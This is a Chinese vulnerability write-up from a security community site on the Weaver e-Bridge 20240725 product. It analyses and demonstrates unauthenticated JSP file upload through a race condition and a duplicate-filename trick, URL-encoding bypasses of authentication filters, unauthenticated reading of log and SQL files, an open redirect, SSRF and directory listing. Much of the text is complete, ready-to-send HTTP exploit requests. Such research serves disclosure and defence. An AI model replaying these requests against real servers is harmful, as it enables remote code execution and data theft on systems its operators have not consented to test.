# 泛微云桥20240725存在未授权文件上传fileUploadForCowork_fileUpload-先知社区

> **来源**: https://xz.aliyun.com/news/17624  
> **文章ID**: 17624

---

下载地址：<https://wx.weaver.com.cn/download>

补丁2023：<https://wx.weaver.com.cn/download/>

补丁2024：<https://wx.weaver.com.cn/download/security>

先安装2023的补丁再安装2024的补丁，

泛微云桥版本：20240725

![](images/20250408152610-becd0f0f-144a-1.png)

###### 后台文件上传

更改上传路径，

![](images/20250408152612-bfb1b808-144a-1.png)

```
POST /main/base/sysInfo/save HTTP/1.1
Host: 192.168.163.132:8088
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: http://192.168.163.132:8088/main/base/sysInfo?c_menu=base_sysInfo
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 262
Origin: http://192.168.163.132:8088
Connection: close
Cookie: EBRIDGE_JSESSIONID=C0FEACC216EBF0F900D4D4203264D92B
Priority: u=1

sysInfo.id=b3812de75d3e4765920ba4d9497c5744&sysInfo.sysouturl=http%3A%2F%2F192.168.91.133%3A8088&sysInfo.sysouterip=117.172.250.72&sysInfo.sysinnerurl=http%3A%2F%2F192.168.91.133%3A8088&sysInfo.filerealpath=C:\ebridge\tomcat\webapps\ROOT&sysInfo.upgrade_remind=1
```

​

然后利用条件竞争进行文件上传（多线程在同一时间发包），以下两个接口均存在漏洞，

/main/portal/uploadCoverOrBanner?fileElementId=ccc

/main/wxpublic/message/saveImageMsgFodders，

```
POST /main/portal/uploadCoverOrBanner?fileElementId=bannerFile HTTP/1.1
Host: 192.168.163.132:8088
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: http://192.168.163.132:8088/main/portal?c_menu=portal
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------344527009441727570493099554103
Content-Length: 231
Origin: http://192.168.163.132:8088
Connection: close
Cookie: EBRIDGE_JSESSIONID=C0FEACC216EBF0F900D4D4203264D92B

-----------------------------344527009441727570493099554103
Content-Disposition: form-data; name="bannerFile"; filename="111.jsp"
Content-Type: image/jpeg

<%= 111 %>
-----------------------------344527009441727570493099554103--

```

​

或者直接使用以下数据包发包，发送两个file文件，name相同覆盖了前一个file，此时循环就会循环一次，只删除了一个文件，还剩下一个文件没有删除，就可以上传成功，

```
POST /main/wxpublic/message/saveImageMsgFodders?fileElementId=ccc HTTP/1.1
Host: 192.168.163.132:8088
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: http://192.168.163.132:8088/main/portal?c_menu=portal
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------344527009441727570493099554103
Content-Length: 374
Origin: http://192.168.163.132:8088
Connection: close
Cookie: EBRIDGE_JSESSIONID=C0FEACC216EBF0F900D4D4203264D92B

-----------------------------344527009441727570493099554103
Content-Disposition: form-data; name="bannerFile"; filename="111.jsp"
Content-Type: image/jpeg

<%= 111 %>
-----------------------------344527009441727570493099554103
Content-Disposition: form-data; name="bannerFile";filename="111.jsp"
Content-Type: image/jpeg

0222
-----------------------------344527009441727570493099554103--

```

![](images/20250408152613-c0372558-144a-1.png)

​

访问<http://192.168.163.132:8088/202502/IE/111.js%70，jsp脚本执行成功>

```
GET /202502/IE/111.js%70 HTTP/1.1
Host: 192.168.163.132:8088
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: http://192.168.163.132:8088/main
Connection: close
Cookie: EBRIDGE_JSESSIONID=C0FEACC216EBF0F900D4D4203264D92B
Priority: u=2


```

![](images/20250408152613-c097cc07-144a-1.png)

###### 后台文件上传漏洞分析

入口函数，uploadPtCover/saveImageMsgFodders/uploadCoverOrBanner/importUser/save/uploadImage，

![](images/20250408152614-c102fa7e-144a-1.png)

​

从这里到后面的MultipartRequest函数都是获取request请求的数据，

![](images/20250408152615-c1743127-144a-1.png)

![](images/20250408152616-c1e7f6f6-144a-1.png)![](images/20250408152616-c24afa2c-144a-1.png)

​

MultipartRequest函数就开始处理传输的文件，然后利用writeTo函数写入到文件中，

![](images/20250408152617-c2c4972b-144a-1.png)![](images/20250408152618-c38f9e60-144a-1.png)![](images/20250408152620-c461cdaa-144a-1.png)

​

然后返回到MultipartRequest函数中，接着利用isSafe函数检查文件是否为jsp或者为php后缀，如果是的话就删除，（可以看到MultipartRequest函数和isSafeFile函数之间获取了multipartRequest中的文件名和类型）

![](images/20250408152621-c4faa041-144a-1.png)

![](images/20250408152622-c578568b-144a-1.png)

![](images/20250408152623-c625298a-144a-1.png)

​

因此getWxBaseFile函数的功能就是先接收上传内容保存到服务器，然后再从request中获取文件名和文件类型，再判断文件是否合法，不合法则删除，

绕过方法就可以利用条件竞争，

或者发送两个file文件，name相同覆盖了前一个file，此时循环就会循环一次，只删除了一个文件，还剩下一个文件没有删除，绕过成功，

最后如果正常访问的话会失败，因此我们需要分析一波咋回事（这里分析写在后面的分析认证逻辑部分），

<http://192.168.163.132:8088/202502/IE/111.jsp>

![](images/20250408152624-c6aa01c6-144a-1.png)

###### 分析认证逻辑

web.xml配置了com.jfinal.core.JFinalFilter，前几个filter都是没有关于验证权限的，这里就使用的是JFinalFilter来验证的权限，

![](images/20250408152625-c7297bfd-144a-1.png)

​

WxJFinalConfig继承了JFinalConfig，其中函数的含义如下，大概就是配置url、处理器、拦截器配置，

```
configConstant(Constants me)	配置常量，如开发模式、JSON 设置
configRoute(Routes me)	配置 URL 路由，如 /hello -> HelloController
configPlugin(Plugins me)	配置插件，如数据库连接池（C3p0, Druid）
configInterceptor(Interceptors me)	配置全局拦截器（权限、日志）
configHandler(Handlers me)	配置全局处理器（跨域、URL 重写）
configEngine(Engine me)	配置 JFinal 模板引擎
```

​

其中值得注意的地方：配置处理器和添加了几个拦截器，

![](images/20250408152626-c7c50d9f-144a-1.png)

​

首先分析处理器，这里添加了4个处理器，

```
me.add(new ContextPathHandler("contextPath"));
me.add(new GlobalHandler());
me.add(new OutSysProxyHandler());
me.add(new DruidStatViewHandler("/druid", new WxDruidStatViewAuth()));
```

其中GlobalHandler和OutSysProxyHandler主要处理路由，

![](images/20250408152626-c85472ed-144a-1.png)

![](images/20250408152627-c8df5acf-144a-1.png)

​

OutSysProxyHandler会通过这几行蓝色语句判断怎么访问，

![](images/20250408152628-c96a44ed-144a-1.png)

​

其中的逻辑就是如果匹配到proxy.xml中的字段，就返回false，

```
<view>
    <pattern>*.jsp</pattern>
    <pattern>/weaver/*</pattern>
    <pattern>/mobile/plugin/*</pattern>
    <pattern>/mobilemode/*</pattern>
</view>
```

​

如果匹配到以下字段，就返回true，因此这里可以使用url编码绕过的限制，因为这里使用request.getRequestURI()后并没有进行相应的过滤措施，

```
<excludes>
       <pattern>/</pattern>
   <pattern>/login.do</pattern>
   <pattern>/*</pattern>
   <pattern>/druid/*</pattern>
   
   </excludes>
```

![](images/20250408152629-c9fb4b15-144a-1.png)

![](images/20250408152630-ca89ec08-144a-1.png)

![](images/20250408152631-cb0e10f1-144a-1.png)

![](images/20250408152632-cb97a15e-144a-1.png)

​

我们需要让isLocalRequest、sLocalResource返回true，才能调出这个if条件，

![](images/20250408152633-cc32fc7c-144a-1.png)

​

因为进入了此条件，就会拦截返回/wxapi/erropage?errcode=，

![](images/20250408152634-ccbffd1e-144a-1.png)

​

因此关于proxy.xml中的配置，我们全部都可以利用url编码进行绕过，

![](images/20250408152635-cd481f46-144a-1.png)

​

当自定义处理器都执行完毕后，再通过jfinal的ActionHandler利用uri获取相关actionMapping实例，

![](images/20250408152636-cdcda8f9-144a-1.png)

​

当所有处理器执行完毕后，会执行拦截器，

```
me.add(new SessionInViewInterceptor());
me.add(new GlobalInterceptor());
me.add(new IocInterceptor());
me.add(new ShiroInterceptor());
me.add(new TempAccountViewLogInterceptor());
me.add(new GestureCipherInterceptor());
```

​

其中GlobalInterceptor拦截器的主要功能是检测uri的路由权限，

![](images/20250408152636-ce481d91-144a-1.png)

​

这里判断url是否为/file/fileNoLogin，或者开头是/wxapi、/wxjsapi、/wxclient、/wxthirdapi，

如不都不是，那么就会进行权限验证，说明以上路径是不经过权限验证的，

```
if (!ai.getActionKey().equals("/file/fileNoLogin") && !ai.getActionKey().startsWith("/wxapi") && !ai.getActionKey().startsWith("/wxjsapi") && !ai.getActionKey().startsWith("/" + wxjsapiurl) && !ai.getActionKey().startsWith("/wxclient")) {
    if (!ai.getActionKey().startsWith("/wxthirdapi")) {
```

![](images/20250408152637-cebe7659-144a-1.png)

​

还判断了访问的控制器或者其方法是否使用了ClearInterceptor注解，如果使用了，那么也会进入下个拦截器，达到绕过权限的目的，

![](images/20250408152638-cf45b14c-144a-1.png)

​

权限认证总结：

GlobalHandler处理器会拦截.log/.sql/.db后缀，可以利用url编码绕过，

OutSysProxyHandler处理器分析路由，

ActionHandler处理器判断uri如果存在.，就会跳过拦截器，

uri如果不存在.，就会根据uri获取actionMapping实例，获取失败就404（虽然能利用uri编码绕过权限限制，但是这里是将uri与actionMapping实例的uri对比是否相同，如/wxapi/mobilelist!=/wxapi/mobilelis%73，因此虽然绕过了权限限制，但是服务找不到正确actionMapping实例了，就会报错404），

之后开始执行拦截器，GlobalInterceptor拦截器会先判断uri的后面部分是否是有大小写字母或数字组成，然后根据uri判断是否需要权限认证，这里有白名单（url为/file/fileNoLogin，或者开头是/wxapi、/wxjsapi、/wxclient、/wxthirdapi），或者访问控制器的类/方法使用ClearInterceptor注解来绕过，

###### 未授权访问日志、sql文件

GlobalHandler中利用url编码绕过，能读ROOT下的log目录中的日志，还能读取.sql、.db文件，

```
GET /log/weixin.lo%67.2025-02-08 HTTP/1.1
Host: 192.168.163.132:8088
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: http://192.168.163.132:8088/main/base/sysInfo?c_menu=base_sysInfo
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 262
Origin: http://192.168.163.132:8088
Connection: close
Cookie: EBRIDGE_JSESSIONID=C0FEACC216EBF0F900D4D4203264
Priority: u=1

sysInfo.id=b3812de75d3e4765920ba4d9497c5744&sysInfo.sysouturl=http%3A%2F%2F192.168.91.133%3A8088&sysInfo.sysouterip=117.172.250.72&sysInfo.sysinnerurl=http%3A%2F%2F192.168.91.133%3A8088&sysInfo.filerealpath=C:\ebridge\tomcat\webapps\ROOT&sysInfo.upgrade_remind=1
```

![](images/20250408152639-cfde2015-144a-1.png)

```
GET /data/mysql/202005131808_wx_core_runtimemsg_insert.sq%6c HTTP/1.1
Host: 192.168.163.132:8088
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: http://192.168.163.132:8088/goModule.do
Connection: close
Cookie: EBRIDGE_JSESSIONID=F5BC87708397FB45B9C1C47921F4390
Upgrade-Insecure-Requests: 1
Priority: u=1


```

![](images/20250408152640-d075280e-144a-1.png)

​

因为GlobalHandler中的target是直接获取的uri，可以利用url编码绕过，![](images/20250408152641-d0f9b3d5-144a-1.png)

![](images/20250408152642-d1822622-144a-1.png)

​

因为最后在ActionHandler中的handle会判断uri是否存在.，不存在才会执行到过滤器，这里访问日志或者sql文件都存在.，因此达到未授权访问文件功能，

![](images/20250408152643-d21b95f2-144a-1.png)

###### 未授权文件上传

利用未授权访问白名单接口，url开头是/wxapi、/wxjsapi、/wxclient、/wxthirdapi，或者访问控制器的类/方法使用ClearInterceptor注解，

（注意需要看管理员设置的保存路径，如果不在web目录，就需要登录后台更改上传路径）

fileUploadForCowork/fileUpload接口，

调用到getFile函数，漏洞原理与上面的后台文件上传一样，只是这里可以利用已/wxclient开头的uri白名单达到权限认证绕过的目的（可以看上面的权限认证部分），

![](images/20250408152644-d2ae5401-144a-1.png)

![](images/20250408152645-d3252ef2-144a-1.png)

![](images/20250408152646-d3b1bec8-144a-1.png)

```
POST /wxclient/app/maw/fileUpload HTTP/1.1
Host: 192.168.163.132:8088
Upgrade-Insecure-Requests: 1
Cookie: EBRIDGE_JSESSIONID=227
Accept-Encoding: gzip, deflate
Referer: http://192.168.163.132:8088/login
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Priority: u=1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Content-Type: multipart/form-data; boundary=---------------------------16056193103380574858834537891
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0
charset: utf-8
Accept: */*
Accept-Encoding: gzip, deflate
Content-Length: 24737

-----------------------------16056193103380574858834537891
Content-Disposition: form-data; name="meetingFile"; filename="1.jsp"
Content-Type: application/text

<%=1111 %>
-----------------------------16056193103380574858834537891
Content-Disposition: form-data; name="meetingFile"; filename="1.jsp"
Content-Type: application/text

<%=1111 %>
-----------------------------16056193103380574858834537891--

```

​

访问上传文件，命令执行成功，

```
POST /202502/LU/1.js%70 HTTP/1.1
Host: 192.168.163.132:8088
Upgrade-Insecure-Requests: 1
Cookie: EBRIDGE_JSESSIONID=22
Accept-Encoding: gzip, deflate
Referer: http://192.168.163.132:8088/login
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Priority: u=1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8


```

![](images/20250408152646-d435414f-144a-1.png)

###### 其他漏洞

前台，OutSysProxyHandler类，url跳转，

192.168.163.132:8088/goModule.do?uri=<http://www.baidu.com>

后台，ssrf，

```
GET /main/wxpublic/message/js/ueditor/loadUEController?action=catchimage&source%5b%5d=http://192.168.163.132:8088/favicon.aa HTTP/1.1
Host: 192.168.163.132:8088
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: http://192.168.163.132:8088/login
Connection: close
Cookie: EBRIDGE_JSESSIONID=E67EFDBC2A5364BACC0E8BEB87D57446
Upgrade-Insecure-Requests: 1
Priority: u=1
Content-Length: 2


```

后台，查看目录，

getDirectories(weaver.weixin.component.controller.DirectoryBroswerController) ，

```
GET /main/component/directoryBroswer/getDirectories?directory=C:/&checkedNodeId= HTTP/1.1
Host: 192.168.163.132:8088
Priority: u=1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Cookie: EBRIDGE_JSESSIONID=0574B385B96D501D41EEFD7103D79D33
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Upgrade-Insecure-Requests: 1


```
